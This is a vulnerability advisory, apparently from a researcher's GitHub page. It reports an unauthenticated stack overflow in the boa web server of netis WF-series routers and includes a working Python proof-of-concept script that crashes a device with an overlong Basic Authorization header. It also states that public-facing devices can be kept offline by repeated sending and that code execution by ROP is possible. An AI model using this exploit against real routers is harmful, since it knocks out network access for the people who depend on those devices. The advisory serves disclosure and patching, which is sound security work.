## netis Denial of service
Product: netis WF2411-WF2880 (http://www.netis-systems.com/Home/info/id/2/hi/21.html)

version：The latest firmware --netis(WF2411)-V2.1.36123(http://www.netis-systems.com/Suppory/de_details/id/1/de/29.html)

Different device firmware version numbers may be different

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/1.png)

Vulnerability location: file:  /bin/boa

function:user_auth->user_ok

Vulnerability Type: buffer overflow cause Denial of service
## Vulnerability Description
There is a stack overflow vulnerability that does not require authentication

This can cause Denial of service or  remote code execution
An attacker can restart a remote device by sending a malicious packet.

Code execution can also be achieved through ROP technology, but it is more difficult

This vulnerability can be triggered by a normal get packet
![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/2.png)
## POC
```
import requests
import sys
import struct
import time
import base64
from pwn import *






def syscmd1(a):
	p=remote('195.211.?',8080)
	payload=''
	payload+='GET / HTTP/1.1\r\n'
	payload+='Host: 192.168.0.1\r\n'
	payload+='Authorization: Basic '+base64.b64encode(payload1)+'\r\n'
	payload+='Upgrade-Insecure-Requests: 1\r\n'
	payload+='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98\r\n'
	payload+='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'

	payload+='Accept-Encoding: gzip, deflate\r\n'
	payload+='Accept-Language: zh-CN,zh;q=0.9"'
	payload+='Connection: close\r\n'
	payload+='\r\n'
	print payload
	p.send(payload)
	p.close()

if __name__ == "__main__":

				payload1='a:aa'+'a'*0x80
				print len(payload1)
				syscmd1('123')		
				print 'down'


```
![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/3.png)
![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/4.png)

## Harm
Can be accessed on the public network
An attacker can make all WF Series devices unusable by sending packets continuously
![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/6.png)

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/7.png)

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/9.png)

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/netis/8.png)
